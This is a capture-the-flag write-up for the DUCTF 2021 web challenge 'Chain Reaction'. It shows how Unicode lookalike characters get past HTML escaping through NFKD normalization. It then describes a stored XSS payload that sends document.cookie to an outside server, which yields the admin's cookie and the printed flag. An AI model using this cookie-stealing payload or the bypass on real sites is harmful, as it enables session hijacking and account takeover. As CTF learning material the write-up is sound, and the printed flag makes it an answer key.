# Chain Reaction

- **Category:** Web

## Challenge

A bunch of university students want to start a company and hired some young university students. I wonder if they paid any attention to security.

Author: n00bmaster
https://web-chainreaction-a4b5ae3b.chal-2021.duc.tf

## Solution

Browsing around reveals `/dev` which reveals `/devchat` where devs talked about the vulnerability in unicode characters

> John: There is a small bug with register/login, it is acting very weird with unicode characters and causes errors with SQLAlchemy when adding those unicode characters. Anyone know a fix? Also the about me section was all html escaped making it look ugly, need to try and find a fix for that as well. It looks very ugly.

> Wick: Yea we can normalize them right? to make that work? Only used it once for a uni project this semester, NFKD I think it was, ill see how we go and for the html thing i think its because its being being pasted as raw value, ill just html escape the page instead

We register a profile then update our profile details with `﹤ˢcrⁱpt﹥fetch("https://ourserver/?c="+document.cookie)﹤/ˢcrⁱpt﹥` and report the page as a problem so admin would visit it

We receive the admin cookie after the admin visits the page `GET /?c=admin-cookie=sup3rs3cur34dm1nc00k13`

We use this `admin-cookie` and replace our `Cookie` to log in as admin to reveal

```html
<h1>You shouldn't be here</h1>
<small>DUCTF{_un1c0de_bypass_x55_ftw!}</small>
```

Flag

```
DUCTF{_un1c0de_bypass_x55_ftw!}
```
